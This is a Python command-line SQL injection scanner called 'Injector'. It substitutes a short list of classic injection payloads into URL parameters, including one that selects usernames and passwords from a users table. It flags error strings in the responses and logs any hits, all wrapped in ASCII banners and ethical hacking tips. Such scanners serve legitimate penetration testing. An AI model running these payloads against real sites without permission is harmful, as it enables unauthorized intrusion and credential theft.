import argparse
import requests
import re
from colorama import Fore, Style, init
def print_hacking_tips():
    tips = [
        "   🛡️ **Always obtain permission** before testing systems for vulnerabilities.",
        "   🔍 **Stay updated** with the latest vulnerabilities and security news.",
        "   ⚙️ **Use the right tools** for the job. Familiarize yourself with tools like Nmap, Burp Suite, and Metasploit.",
        "   📚 **Never stop learning!** Cybersecurity is constantly evolving. Invest time in continuous education.",
        "   📝 **Document your findings** thoroughly. Good reporting can help improve security measures."
    ]
    
    print(f"   {Fore.CYAN}✨ Ethical Hacking Tips ✨{Style.RESET_ALL}")
    print("    __________________________________________________________________")
    print(" ")
    for tip in tips:
        print(f"{Fore.YELLOW}{tip}{Style.RESET_ALL}")
    
    print(f"\n    {Fore.MAGENTA}This tool is created by Biswajit Rout 🚀 {Style.RESET_ALL}")
    print(" ")
    print(f"    {Fore.GREEN}💡 Stay safe and hack ethically! 💡{Style.RESET_ALL}")

# Call the function to display tips


# Initialize colorama
init(autoreset=True)
gradient_colors = [
    Fore.RED, Fore.LIGHTYELLOW_EX, Fore.YELLOW,
    Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.LIGHTCYAN_EX,
    Fore.CYAN, Fore.LIGHTBLUE_EX, Fore.BLUE,
    Fore.LIGHTMAGENTA_EX, Fore.MAGENTA
]

# ASCII Art for the tool name "Injector"
def print_injector_ascii_art():
    ascii_art = """
            +---+  +---+  +---+  +---+  +---+  +---+  +---+  +---+  
            | I |  | n |  | j |  | e |  | c |  | t |  | o |  | r |  
            +---+  +---+  +---+  +---+  +---+  +---+  +---+  +---+  
    """
    # Print each line with gradient colors
    for i, line in enumerate(ascii_art.splitlines()):
        color_index = int((i / len(ascii_art.splitlines())) * (len(gradient_colors) - 1))  # Calculate gradient color index
        print(gradient_colors[color_index] + line + Style.RESET_ALL)


def border_art():
    border_art = """
    -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""
    print(Fore.GREEN + border_art + Style.RESET_ALL)
# ASCII Art for the scanner
def print_ascii_art():
    ascii_art_lines = [
        "                                .--.          ",
        "                         ,-.------+-.|   ,-.     ",
        "                ,--=======* )\"(\"\")===)===* )    ",
        "                �        `-\"---==-+-\"|   `-\"     ",
        "                O                 '--'    "
    ]
    
    # Determine the number of colors
    num_colors = len(gradient_colors)
    total_lines = len(ascii_art_lines)

    # Print each line with gradient colors
    for i, line in enumerate(ascii_art_lines):
        color_index = int((i / total_lines) * (num_colors - 1))  # Calculate gradient color index
        print(gradient_colors[color_index] + line + Style.RESET_ALL)

# Function to print the tool banner
def print_tool_banner():
    banner = """
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
                |                                          |
                +         SQL Injection Scanner Tool       +
                |               Version: 1.0 🚀            |
                +    Detect SQL injection vulnerabilities  +
                |                 and enhance security!🔒  |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +
"""
    print(Fore.CYAN + banner + Style.RESET_ALL)

payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a' --",
    "\" OR 1=1 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT username, password FROM users --"
]

# Default headers and cookies
default_headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html",
}
default_cookies = {
    "sessionid": "abcd1234efgh5678ijkl91011mnop",  # Example session ID
    "user_token": "xyz98765uvw4321"                # Example user authentication token
}

# Function to parse URL parameters
def get_parameters_from_url(url):
    # Regex to find parameters in the URL
    parsed_params = re.findall(r'[\?\&]([^\=\&]+)\=([^\=\&]*)', url)
    return dict(parsed_params)

# Function to test SQL injection on a URL
def test_injection(url, param, payload, headers=None, cookies=None):
    # Modify the parameter value with the payload
    injection_url = url.replace(f"{param}=", f"{param}={payload}")
    try:
        response = requests.get(injection_url, headers=headers, cookies=cookies)
        if response.ok:
            # Analyze the response for signs of SQL injection
            if "SQL" in response.text or "syntax error" in response.text:
                print(f"{Fore.RED}[+] ✅ Vulnerability found! {Fore.GREEN}URL: {injection_url} | {Fore.MAGENTA}Payload: {payload}{Style.RESET_ALL}")
                log_vulnerability(injection_url, payload)
            else:
                print(f"{Fore.LIGHTBLUE_EX}[-] No vulnerability detected for {Fore.RED}payload: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to get a response from {Fore.GREEN}{injection_url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error testing injection on {Fore.GREEN}{injection_url}: {e}{Style.RESET_ALL}")

# Function to log vulnerabilities found
def log_vulnerability(url, payload):
    with open("vulnerabilities.log", "a") as log_file:
        log_file.write(f"Vulnerable URL: {url} | Payload: {payload}\n")

# Main function to scan a URL for SQL injection
def scan(url, headers=None, cookies=None):
    params = get_parameters_from_url(url)
    if not params:
        print(f"{Fore.RED}[-] No parameters found in the URL to test.{Style.RESET_ALL}")
        return

    for param in params:
        print(f"{Fore.BLUE}[~] Testing parameter: {param}{Style.RESET_ALL}")
        for payload in payloads:
            test_injection(url, param, payload, headers, cookies)

# Command-line interface setup
def main():
    border_art()
    print_injector_ascii_art()  # Print the ASCII art for the tool name at the start
    print_ascii_art()  # Print the additional ASCII art
    print_tool_banner()  # Print the tool banner
    print_hacking_tips()
    border_art()
    print(" ")
    parser = argparse.ArgumentParser(
        description=f"{Fore.CYAN}Advanced SQL Injection Scanner{Style.RESET_ALL}",
        epilog=f"{Fore.MAGENTA}Usage Example:\n"
               f"  python sql3.py -u http://example.com/page.php?param=value\n"
               f"  python sql3.py -u http://example.com/page.php?param=value --headers 'User-Agent:Mozilla/5.0' --use-defaults{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", help=f"{Fore.YELLOW}URL to scan{Style.RESET_ALL}", required=True)
    parser.add_argument("--headers", help=f"{Fore.YELLOW}Custom headers (key1:value1,key2:value2){Style.RESET_ALL}", default="")
    parser.add_argument("--cookies", help=f"{Fore.YELLOW}Custom cookies (key1:value1,key2:value2){Style.RESET_ALL}", default="")
    parser.add_argument("--use-defaults", help=f"{Fore.YELLOW}Use default headers and cookies{Style.RESET_ALL}", action="store_true")
    args = parser.parse_args()

    # Determine headers and cookies
    headers = default_headers if args.use_defaults else (dict(item.split(":") for item in args.headers.split(",")) if args.headers else None)
    cookies = default_cookies if args.use_defaults else (dict(item.split(":") for item in args.cookies.split(",")) if args.cookies else None)

    print(f"{Fore.CYAN}[~] Starting scan on URL: {args.url}{Style.RESET_ALL}")
    scan(args.url, headers, cookies)
    print(f"{Fore.CYAN}[~] Scan complete. Check vulnerabilities.log for details.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
